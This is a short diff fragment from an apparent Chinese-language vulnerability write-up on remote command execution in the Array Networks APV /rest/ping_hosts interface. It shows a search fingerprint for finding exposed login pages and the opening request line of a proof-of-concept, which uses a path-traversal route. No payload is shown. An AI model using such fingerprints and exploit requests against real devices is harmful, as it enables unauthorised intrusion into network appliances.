@@ -8,7 +8,7 @@ Array Networks APV应用交付系统 /rest/ping_hosts 接口存在远程命令�
 app="Array-APV" && title=="Login"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /restapi/../rest/ping_hosts HTTP/1.1
